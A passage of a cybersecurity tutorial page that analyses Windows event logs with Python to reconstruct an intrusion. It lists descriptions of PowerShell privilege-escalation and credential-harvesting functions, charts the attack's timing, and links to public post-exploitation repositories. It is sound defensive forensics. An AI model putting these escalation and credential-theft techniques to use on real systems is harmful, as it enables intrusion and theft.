+Description:
+Tests one or more passed services or service names against a given permission set,
+returning the service objects where the current user have the specified permissions.
+
+&gt; Get-ProcessTokenType
+
+Description:
+Returns the token type and impersonation level.
+
+&gt; Get-ProcessTokenGroup
+
+Description:
+Returns all SIDs that the current token context is a part of, whether they are disabled or not.
+
+&gt; Get-ModifiablePath
+
+Description:
+Parses a passed string containing multiple possible file/folder paths and returns
+the file paths where the current user has modification rights.
+
+&gt; New-InMemoryModule
+
+Description:
+Creates an in-memory assembly and module
+
+&gt; local:Get-GPPInnerField
+
+Description:
+Writes out a precompiled MSI installer that prompts for a user/group addition.
+This function can be used to abuse Get-RegistryAlwaysInstallElevated.
+
+&gt; Get-ApplicationHost
+
+Description:
+Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
+
+&gt; Get-RegistryAutoLogon
+
+Description:
+Finds any autologon credentials left in the registry.
+
+&gt; Find-PathDLLHijack
+
+Description:
+Finds all directories in the system %PATH% that are modifiable by the current user.
+
+&gt; Write-ServiceBinary
+
+Description:
+Patches in the specified command to a pre-compiled C# service executable and
+writes the binary out to the specified ServicePath location.
+
+&gt; Get-UnquotedService
+
+Description:
+Returns the name and binary path for services with unquoted paths
+that also have a space in the name.
+
+&gt; Enable-Privilege
+
+Description:
+Enables a specific privilege for the current process.
+
+5) What is the TaskDisplayName for these messages
+&gt; PowerShell Console Startup
+&gt; PowerShell Named Pipe IPC
+&gt; Executing Pipeline
+&gt; Execute a Remote Command
+
+6) What is the date and time of these actions
+Date        Time    
+22/10/2020  15:06:50    43
+            15:06:14    36
+            15:03:18     3
+            15:03:20     3
+            15:03:45     3
+            15:05:24     3
+            15:05:29     3
+            15:05:47     3
+            15:06:13     3
+            15:07:08     3
+            15:09:40     3
+            15:12:18     3
+            15:02:56     2
+            15:03:34     2
+            15:06:15     2
+            15:07:01     2
+            14:11:16     1
+            14:11:18     1
+            14:11:21     1
+            15:02:55     1
+            15:03:35     1
+26/10/2020  08:54:11     3
+            08:58:27     3
+            19:39:48     3
+            19:39:26     2
+            08:53:41     1
+            08:53:46     1
+            08:53:49     1
+            19:38:38     1
+            19:38:44     1
+            19:38:50     1
+            19:39:25     1
+Name: Time, dtype: int64
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/6_SUMMARY_report_on_successful_actions.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;1) How many were successful</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">sum</span><span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">2) Which account executed them</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;UserContext&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">3) The (unique) URLs embedded in the scripts:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">to_print</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">links</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;URLs&quot;</span><span class="p">]:</span>
+        <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">links</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="s2">&quot;object&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+            <span class="n">to_print</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">pd</span><span class="o">.</span><span class="n">Series</span><span class="p">(</span><span class="n">to_print</span><span class="p">)</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">4) Which functions of the script got executed</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">repetitions</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">])):</span>
+        <span class="n">function</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;FunctionName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
+        <span class="n">description</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;FunctionDescription&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">function</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">function</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">repetitions</span><span class="p">):</span>
+            <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&gt; </span><span class="si">{</span><span class="n">function</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="n">repetitions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">function</span><span class="p">)</span>
+            <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Description:</span><span class="se">\n</span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">continue</span>
+
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">5) What is the TaskDisplayName for these messages</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">taskName</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;TaskDisplayName&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">():</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&gt; </span><span class="si">{</span><span class="n">taskName</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">6) What is the date and time of these actions</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">record</span> <span class="ow">in</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][[</span><span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Time&quot;</span><span class="p">]]</span><span class="o">.</span><span class="n">iterrows</span><span class="p">():</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">record</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">record</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="activity-visualization">
+<h2>Activity visualization<a class="headerlink" href="#activity-visualization" title="Permalink to this headline">#</a></h2>
+<p>Last but not least, we can visualize the activity of the PowerShell actions.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">timeseries_df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">powershell_df</span><span class="p">[[</span><span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Time&quot;</span><span class="p">]]</span><span class="o">.</span><span class="n">value_counts</span><span class="p">())</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
+<span class="n">timesteps</span> <span class="o">=</span> <span class="n">timeseries_df</span><span class="p">[[</span><span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Time&quot;</span><span class="p">]]</span><span class="o">.</span><span class="n">agg</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">timeseries_df</span> <span class="o">=</span> <span class="n">timeseries_df</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">timestep</span><span class="o">=</span><span class="n">timesteps</span><span class="p">)</span>
+<span class="n">timeseries_df</span> <span class="o">=</span> <span class="n">timeseries_df</span><span class="o">.</span><span class="n">sort_values</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Time&quot;</span><span class="p">])</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">timeseries_df</span><span class="o">.</span><span class="n">sort_values</span><span class="p">(</span><span class="n">by</span><span class="o">=</span><span class="s2">&quot;Date&quot;</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">figure</span><span class="p">(</span><span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span><span class="mi">15</span><span class="p">))</span>
+<span class="n">sns</span><span class="o">.</span><span class="n">lineplot</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">timeseries_df</span><span class="p">,</span> <span class="n">x</span><span class="o">=</span><span class="s2">&quot;timestep&quot;</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">xlabel</span><span class="p">(</span><span class="s2">&quot;Time Step&quot;</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">ylabel</span><span class="p">(</span><span class="s2">&quot;Number of events&quot;</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">xticks</span><span class="p">(</span><span class="n">rotation</span><span class="o">=</span><span class="mi">45</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">savefig</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/activity_visualization.PNG&quot;</span><span class="p">)</span>
+<span class="n">plt</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><img alt="png" src="_images/output_95_0.png" /></p>
+</section>
+<section id="usage-of-services-during-the-time-of-the-malicious-activity">
+<h2>Usage of services during the time of the malicious activity<a class="headerlink" href="#usage-of-services-during-the-time-of-the-malicious-activity" title="Permalink to this headline">#</a></h2>
+<p>Additionally, from the <em>LogName</em> attribute, we can retrieve information about the services used during an event occurrence. One of the value indicates that rows containing it may be related to a remote activity.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">tmp</span> <span class="o">=</span> <span class="n">cleaned_data</span><span class="p">[</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">LogName</span> <span class="o">==</span> <span class="s2">&quot;Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational&quot;</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">tmp</span><span class="p">[</span><span class="s2">&quot;Message&quot;</span><span class="p">])</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">tmp</span><span class="p">[</span><span class="s2">&quot;Date&quot;</span><span class="p">])</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">tmp</span><span class="p">[</span><span class="s2">&quot;Time&quot;</span><span class="p">])</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Remote Desktop Services: User authentication succeeded:
+
+User: user
+Domain: 
+Source Network Address: 22.22.22.136
+22/10/2020
+15:30:53
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">tmp</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="s2">&quot;User authentication succeeded&quot;</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">[</span><span class="s2">&quot;Message&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">tmp</span><span class="p">[</span><span class="s2">&quot;Time&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">tmp</span><span class="p">[</span><span class="s2">&quot;Date&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">tmp</span><span class="p">[</span><span class="s2">&quot;Message&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>11:55:22 23/10/2020 Remote Desktop Services: User authentication succeeded:
+
+User: user
+Domain: 
+Source Network Address: 22.22.22.136 
+
+15:38:57 22/10/2020 Remote Desktop Services: User authentication succeeded:
+
+User: user
+Domain: 
+Source Network Address: 22.22.22.136 
+
+15:30:53 22/10/2020 Remote Desktop Services: User authentication succeeded:
+
+User: user
+Domain: 
+Source Network Address: 22.22.22.136 
+</pre></div>
+</div>
+</section>
+<section id="conclusion">
+<h2>Conclusion<a class="headerlink" href="#conclusion" title="Permalink to this headline">#</a></h2>
+<p>As seen in the report, the attackers executed 19 functions allowing for gathering credentials, elevating privileges and changing configurations.
+There were 140 successful operations, executed in the context of <em>user</em> user on the <em>WIN-PTFPHFCRDJ0</em> device.</p>
+<p>The URLs present in these messages suggest that some resources hosted by the attackers were accessed by scripts, however, some URLs seem like references for functions descriptions. The resources accessed by scripts are possibly:</p>
+<ul class="simple">
+<li><p><strong>gistfile1.txt</strong> (some text file)</p></li>
+<li><p><strong>PostExploitation.psm1</strong> (PowerShell post-exploitation module aimed at retrieving information about possible privilege escalation vectors.</p></li>
+<li><p><strong>windows_autologin.rb</strong> (Ruby module which extracts the plain-text Windows user login password in Registry)</p></li>
+<li><p><strong>PSReflect.psm1</strong>. (PowerShell module for interacting with Win32 data structures and functions in memory)</p></li>
+</ul>
+<p>It is quite clear that most of the modules were retrieved from repositories containing post-exploitation scripts. They can be found at:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/mattifestation/PSReflect">https://github.com/mattifestation/PSReflect</a> (<strong>PSReflect</strong>)</p></li>
+<li><p><a class="reference external" href="https://github.com/darkoperator/Posh-SecMod">https://github.com/darkoperator/Posh-SecMod</a> (<strong>Posh-SecModule</strong> project) <br>
+or as a part of <strong>Rapid7 Metasploit Framework’s post-exploitation tools</strong>. <br></p></li>
+</ul>
+<p>The attackers might have gained administrative access to the system and might have established persistence on it. The messages suggest that the following actions were performed:</p>
+<ul class="simple">
+<li><p>bypassing the User Account Control (UAC)</p></li>
+<li><p>installing malicious software using Get-RegistryAlwaysInstallElevated</p></li>
+<li><p>obtaining third-party software passwords - for example for McAfee products</p></li>
+<li><p>obtaining information on the scheduled tasks using Get-ModifiableScheduledTaskFile function (after modifications to these tasks, elevated context might have been obtained)</p></li>
+<li><p>performing DLL hijacking</p></li>
+<li><p>replacing a legitimate service binary with a malicious one</p></li>
+<li><p>abusing the functionality of a service to perform additional activities in an elevated context</p></li>
+<li><p>performing token impersonation</p></li>
+<li><p>obtaining credentials through: autologon features, getting encrypted passwords from application pool and virtual directories abusing applicationHost.config file</p></li>
+<li><p>enabling a certain privilege for a process</p></li>
+</ul>
+<p>There is no evidence on obtaining domain persistence in terms of the golden or silver keys which could have been captured using Mimikatz. <br> <br>
+The temporal activity indicates that priviledge escalation was performed on the 22nd October from around 15:00 and possibly finished successfully by around 15:15. At 15:30 the first RDP connection was established from a node of an IP address: 22.22.22.136.</p>
+<p>As a form of backing up our findings, we can save the messages related to successful actions to the disk</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/7_all_successful_actions.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">corrected_index</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">corrected_index</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">message</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
+        <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n\n\n</span><span class="s2">Message: </span><span class="si">{</span><span class="n">corrected_index</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\n\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>We can exclude some messages from the file</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">exclude1</span> <span class="o">=</span> <span class="s2">&quot;PowerShell console is starting up&quot;</span>
+<span class="n">exclude2</span> <span class="o">=</span> <span class="s2">&quot;Windows PowerShell has started an IPC listening thread on process&quot;</span>
+<span class="n">exclude3</span> <span class="o">=</span> <span class="s2">&quot;PowerShell console is ready for user input&quot;</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;simple_analysis_reports/8_unique_successful_actions.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">corrected_index</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">repeated</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">corrected_index</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">message</span> <span class="o">=</span> <span class="n">powershell_df</span><span class="p">[</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">failed</span> <span class="o">==</span> <span class="mi">0</span><span class="p">][</span><span class="s2">&quot;Message&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">iloc</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">message</span> <span class="ow">in</span> <span class="n">repeated</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">exclude1</span> <span class="ow">in</span> <span class="n">message</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">exclude2</span> <span class="ow">in</span> <span class="n">message</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">exclude3</span> <span class="ow">in</span> <span class="n">message</span><span class="p">):</span>
+            <span class="k">continue</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n\n\n</span><span class="s2">Message: </span><span class="si">{</span><span class="n">corrected_index</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\n\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="n">repeated</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>The analysis focused on some specific messages due to immediate identification of the subset of interest. As seen below, the analysis focused on 0.93% of all messages which were contained in the log files. For the other part of the corpus other techniques can be used.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">round</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">powershell_df</span><span class="o">.</span><span class="n">Message</span><span class="p">)</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">cleaned_data</span><span class="o">.</span><span class="n">Message</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span><span class="si">}</span><span class="s2">%&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>0.927%
+</pre></div>
+</div>
+</section>
+</section>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./."
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+            </main>
+            <footer class="footer-article noprint">
+                
+    <!-- Previous / next buttons -->
+<div class='prev-next-area'>
+    <a class='left-prev' id="prev-link" href="index.html" title="previous page">
+        <i class="fas fa-angle-left"></i>
+        <div class="prev-next-info">
+            <p class="prev-next-subtitle">previous</p>
+            <p class="prev-next-title">Data Science for Cybersecurity</p>
+        </div>
+    </a>
+</div>
+            </footer>
+        </div>
+    </div>
+    <div class="footer-content row">
+        <footer class="col footer"><p>
+  
+    By Piotr Stachyra<br/>
+  
+      &copy; Copyright 2022.<br/>
+</p>
+        </footer>
+    </div>
+    
+</div>
+
+
+      </div>
+    </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf"></script>
+
+
+  </body>
+</html>
